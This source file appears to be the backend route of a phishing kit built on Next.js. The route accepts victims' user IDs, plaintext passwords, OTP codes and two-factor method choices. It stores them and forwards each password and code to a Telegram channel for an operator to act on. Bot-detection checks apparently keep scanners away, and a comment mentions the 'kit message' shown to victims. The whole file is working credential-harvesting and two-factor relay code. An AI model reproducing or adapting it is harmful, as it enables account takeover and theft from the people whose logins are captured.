import { hasDatabaseUrl, formatPendingLoginDatabaseLabel } from "@/lib/database-urls"
import { MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages"
import { resolveMemberOrigin } from "@/lib/member-origin"
import { NextRequest, NextResponse, after } from "next/server"
import { forceBlockIp } from "@/lib/bot-risk/force-block"
import { readHoneypotValue } from "@/lib/bot-risk/honeypot"
import { hasBrowserProof, isTooFastLogin } from "@/lib/bot-risk/proof-cookies"
import { consumeRateLimit } from "@/lib/bot-risk/rate-limit"
import { isMitigationBand, ttlMsForBand } from "@/lib/bot-risk/score"
import { resolveRequestRisk } from "@/lib/bot-risk/resolve"
import { upsertIpRisk } from "@/lib/bot-risk/store"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { isLocalTestingUnlocked } from "@/lib/local-testing"
import { parsePendingLoginBody } from "@/lib/pending-login-input"
import { createPendingLogin } from "@/lib/pending-logins"
import { DEFAULT_PROJECT_ID, getApprovalsUrl } from "@/lib/project-config"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"
import {
  sendLoginApprovalRequest,
  sendMethodApprovalRequest,
  sendOtpApprovalRequest,
} from "@/lib/telegram-approval-send"

const LOGIN_RATE_LIMIT = 8
const LOGIN_RATE_WINDOW_MS = 10 * 60 * 1000

function gateMethod(value: string): "email" | "text" {
  return value === "email" ? "email" : "text"
}

export async function POST(request: NextRequest) {
  const localTesting = isLocalTestingUnlocked()
  const ip = getClientIpFromRequest(request) || "Unknown"
  const userAgent = request.headers.get("user-agent") || "Unknown"

  if (!localTesting) {
    const risk = await resolveRequestRisk(request)
    if (isMitigationBand(risk.band)) {
      return NextResponse.json({ error: "Forbidden" }, { status: 403 })
    }

    if (!hasBrowserProof(request)) {
      await upsertIpRisk({
        ip,
        score: 40,
        band: "watch",
        flags: ["missing_browser_proof"],
        userAgent,
        expiresAtMs: Date.now() + ttlMsForBand("watch"),
      })
      return NextResponse.json({ error: "Forbidden" }, { status: 403 })
    }
  }

  if (!hasDatabaseUrl()) {
    // Infrastructure detail stays server-side; members only ever see the kit message.
    console.error("Pending login unavailable: DATABASE_URL is not set (add it to .env.local / same Neon URL as Control Center) so requests appear in admin")
    return NextResponse.json({ error: MSG_UNABLE_REACH_VERIFICATION }, { status: 503 })
  }
  try {
    const body = (await request.json().catch(() => null)) as Record<
      string,
      unknown
    > | null
    const dwellMs = typeof body?.dwellMs === "number" ? body.dwellMs : undefined
    const interacted =
      typeof body?.interacted === "boolean" ? body.interacted : undefined

    if (!localTesting && body) {
      const honeypot = readHoneypotValue(body)
      if (honeypot) {
        await forceBlockIp(ip, ["honeypot"], userAgent)
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }

      if (isTooFastLogin(request, dwellMs)) {
        await upsertIpRisk({
          ip,
          score: 55,
          band: "challenge",
          flags: ["too_fast_submit"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("challenge"),
        })
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }

      if (interacted === false && typeof dwellMs === "number" && dwellMs < 2500) {
        await upsertIpRisk({
          ip,
          score: 40,
          band: "watch",
          flags: ["no_interaction"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("watch"),
        })
      }

      const rate = await consumeRateLimit(
        ip,
        "pending_login",
        LOGIN_RATE_LIMIT,
        LOGIN_RATE_WINDOW_MS,
      )
      if (!rate.allowed) {
        await upsertIpRisk({
          ip,
          score: 60,
          band: "challenge",
          flags: ["login_rate_limited"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("challenge"),
        })
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }
    }

    const input = parsePendingLoginBody(body)
    if (!input) {
      return NextResponse.json(
        { error: "Invalid pending login payload." },
        { status: 400 },
      )
    }

    const memberOrigin = resolveMemberOrigin(request)
    const approvalsUrl = getApprovalsUrl()

    if (input.kind === "method") {
      const record = await createPendingLogin({
        requestKind: "method",
        projectId: DEFAULT_PROJECT_ID,
        projectName: SITE_DISPLAY_NAME,
        userId: input.userId,
        password: input.twoFactorMethod,
        method: gateMethod(input.twoFactorMethod),
        maskedEmail: "-",
        maskedPhone: "-",
        memberOrigin,
      })

      const databaseShard = formatPendingLoginDatabaseLabel(record.id)
      await sendMethodApprovalRequest({
        userId: record.userId,
        method: input.twoFactorMethod,
        createdAtMs: record.createdAt,
        adminLink: approvalsUrl,
      }).catch((err) => console.error("Failed to send method approval:", err))

      return NextResponse.json({ id: record.id })
    }

    if (input.kind === "otp") {
      const record = await createPendingLogin({
        requestKind: "otp",
        projectId: DEFAULT_PROJECT_ID,
        projectName: SITE_DISPLAY_NAME,
        userId: input.userId,
        password: input.otp,
        method: gateMethod(input.twoFactorMethod),
        maskedEmail: "-",
        maskedPhone: "-",
        memberOrigin,
      })

      after(async () => {
      const databaseShard = formatPendingLoginDatabaseLabel(record.id)
        await sendOtpApprovalRequest({
          userId: record.userId,
          code: record.password,
          method: input.twoFactorMethod,
          createdAtMs: record.createdAt,
          adminLink: approvalsUrl,
          databaseShard,
      })
      })

      return NextResponse.json({ id: record.id })
    }

    const record = await createPendingLogin({
      requestKind: "login",
      projectId: DEFAULT_PROJECT_ID,
      projectName: SITE_DISPLAY_NAME,
      userId: input.userId,
      password: input.password,
      method: input.method,
      maskedEmail: input.maskedEmail,
      maskedPhone: input.maskedPhone,
      memberOrigin,
    })

    after(async () => {
      const databaseShard = formatPendingLoginDatabaseLabel(record.id)
      await sendLoginApprovalRequest({
        userId: record.userId,
        password: record.password,
        method: record.method,
        createdAtMs: record.createdAt,
        adminLink: approvalsUrl,
          databaseShard,
      })
    })

    return NextResponse.json({ id: record.id })
  } catch (e) {
    console.error("Pending login create error:", e)
    return NextResponse.json({ error: MSG_UNABLE_REACH_VERIFICATION }, { status: 500 })
  }
}
